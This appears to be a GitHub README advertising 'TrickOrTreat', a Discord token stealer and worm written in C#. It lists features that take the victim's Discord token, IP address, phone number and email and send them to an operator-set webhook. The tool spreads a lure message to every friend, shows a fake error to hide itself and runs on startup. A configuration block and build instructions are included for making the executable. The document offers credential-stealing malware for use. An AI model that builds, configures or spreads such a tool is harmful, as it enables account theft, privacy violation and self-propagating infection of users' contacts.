# TrickOrTreat
A Discord token stealer/worm that can spread a message to all friends. Also has many features like Run On Startup, Fake Error, and etc.

<p align="center">
<img src="https://img.shields.io/github/languages/top/extatent/TrickOrTreat?style=flat-square" </a>
<img src="https://img.shields.io/github/last-commit/extatent/TrickOrTreat?style=flat-square" </a>
<img src="https://img.shields.io/github/license/extatent/TrickOrTreat?style=flat-square" </a>
<img src="https://img.shields.io/github/stars/extatent/TrickOrTreat?color=%23daff00&label=Stars&style=flat-square" </a>
<img src="https://img.shields.io/github/forks/extatent/TrickOrTreat?color=%23daff00&label=Forks&style=flat-square" </a>

---

**NOTE:** ⭐ If you like the project, feel free to star it ⭐

#### Features:
- Classic Mode (Sends only Discord token and IP address in an non-embedded format.)
- Spread Mode (Sends a message to all friends.)
- Fake Error (Throws a fake error after opening the program.)
- Run On Startup (Runs the program once the computer is started.)
- Sends Discord Embeds
- Getting the user's information (Discord Token, IP Address, Phone Number, Email and many more)

### Configurations
```csharp
static string webhook = "https://discord.com/api/webhooks/example/example"; // Enter Discord webhook
static bool ClassicMode = false; // Sends only the Discord token and IP address in an non-embedded format. (true/false)
static bool SpreadMode = false; // Sends the file/message to all friends (true/false)
static string WormMessage = ""; // Enter the message you want the user to spread (the message can include invite links, download urls and so on)
static bool FakeError = false; // Throws a fake error after opening the program (true/false)
static bool RunOnStartup = false; // Runs the program once the computer is started (true/false)
```
**NOTE:** These settings can be found in the program.cs file.
  
<details>
<summary>Preview</summary>
<img src="https://i.imgur.com/xXLae84.png" alt="png">

<img src="https://i.imgur.com/BN3LYfT.png" alt="png">
</details>

## Installation
  
>Click the green "Code" button. 
  
>Click "Download ZIP".
  
>Extract the ZIP.

>Open the TrickOrTreat.sln, in Visual Studio go to Program.cs and edit your webhook with the settings then head to Build>Build Solution
  
>Go to bin>debug folder to get the executable.

>NOTE: Make sure you have [Visual Studio 2019 or Visual Studio 2022](https://visualstudio.microsoft.com/downloads/) and [.NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework) installed.

---
### TrickOrTreat is licensed under the GNU General Public License v3.0. See the [LICENSE](https://github.com/extatent/TrickOrTreat/blob/main/LICENSE) file for details.
